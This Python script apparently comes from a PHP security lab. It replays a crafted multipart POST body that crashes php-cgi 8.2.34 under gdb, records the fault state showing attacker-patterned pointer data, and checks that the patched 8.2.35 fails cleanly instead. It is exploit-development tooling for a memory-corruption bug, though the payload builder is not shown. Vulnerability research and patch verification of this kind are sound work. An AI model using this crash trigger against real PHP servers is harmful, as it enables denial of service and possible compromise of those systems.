#!/usr/bin/env python3
"""oom42: gdb kill shot + 8.2.35 fixed contrast.
1) Run the oom41 winning shape (lim=20600000 k1=2044 prep=3 poison=163840)
   under gdb batch in phpbuild -> faulting instruction, registers, backtrace,
   memory at the deref target (expect 0x0808... pattern).
2) Same body against VANILLA php-8.2.35 php-cgi in phpbuild35 -> expect
   clean rc=255 fatal, NO segv (patched zend_hash keeps slot consistent).
"""
import re
import subprocess
import sys

exec(open("/tmp/phplab/oom39.py").read().replace('if __name__ == "__main__":', 'if False:'))
exec(open("/tmp/phplab/oom41.py").read().replace('if __name__ == "__main__":', 'if False:'))

BIN34 = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
BIN35 = "/usr/src/php-8.2.35/sapi/cgi/php-cgi"


def run_gdb(body, limit):
    """Run winning shape under gdb batch; return (rc, gdb output, trace)."""
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
                   input=body, capture_output=True, timeout=120)
    gdb_cmds = ("run\\n"
                "printf \\n===FAULT===\\n\\n"
                "info registers rip rsi rdi rax rbx rcx rdx rbp rsp\\n"
                "x/i \\$pc\\n"
                "bt 8\\n"
                "quit\\n")
    cmd = ("gdb -q -batch -ex 'set confirm off' "
           "-ex 'handle SIGSEGV stop nopass' "
           "-ex run "
           "-ex 'printf \"\\\\n===FAULT===\\\\n\"' "
           "-ex 'info registers rip rsi rdi rax rbx rcx rdx' "
           "-ex 'x/2i $pc' "
           "-ex 'bt 8' "
           "%s -d memory_limit=%d -d post_max_size=4096M -d max_input_vars=100000 "
           "-d max_execution_time=0 "
           "< /tmp/body.bin > /tmp/gdb.log 2>&1; echo RC=$?") % (BIN34, limit)
    env = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php " % len(body))
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", env + cmd],
                       capture_output=True, timeout=590)
    rc = r.stdout.decode().strip()
    g = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/gdb.log"],
                       capture_output=True).stdout.decode("latin1")
    return rc, g


def run35(body, limit):
    """Vanilla 8.2.35: same body, plain CGI, no instrument."""
    subprocess.run(["docker", "exec", "-i", "phpbuild35", "sh", "-c", "cat > /tmp/body35.bin"],
                   input=body, capture_output=True, timeout=120)
    # t_probe.php exists only in phpbuild; recreate minimal in phpbuild35
    subprocess.run(["docker", "exec", "phpbuild35", "sh", "-c",
                    "printf '<?php echo \"LEN=\".strlen(file_get_contents(\"php://input\"));' > /tmp/t_probe.php"],
                   capture_output=True)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%d -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/body35.bin >/tmp/o35.log 2>/tmp/e35.log; echo RC=$?") % (len(body), BIN35, limit)
    r = subprocess.run(["docker", "exec", "phpbuild35", "sh", "-c", cmd],
                       capture_output=True, timeout=590)
    rc = r.stdout.decode().strip()
    tr = subprocess.run(["docker", "exec", "phpbuild35", "sh", "-c",
                         "cat /tmp/e35.log /tmp/o35.log | tail -8"],
                        capture_output=True).stdout.decode("latin1")
    return rc, tr


if __name__ == "__main__":
    lim = int(sys.argv[1]) if len(sys.argv) > 1 else 20_600_000
    body = build41(2044, 3, 163840)

    print("=== [1] gdb kill shot (8.2.34 instrumented) ===", flush=True)
    rc, g = run_gdb(body, lim)
    print("gdb RC:", rc)
    # show the fault section
    i = g.find("Program received signal")
    print(g[i:i + 2200] if i >= 0 else g[-2200:])
    print("---", flush=True)

    print("=== [2] vanilla 8.2.35 (patched) same body ===", flush=True)
    rc35, tr35 = run35(body, lim)
    print("8.2.35 RC:", rc35)
    print(tr35)
    seg35 = "Segmentation" in tr35
    print("SEGFAULT ON FIXED:" , seg35, flush=True)
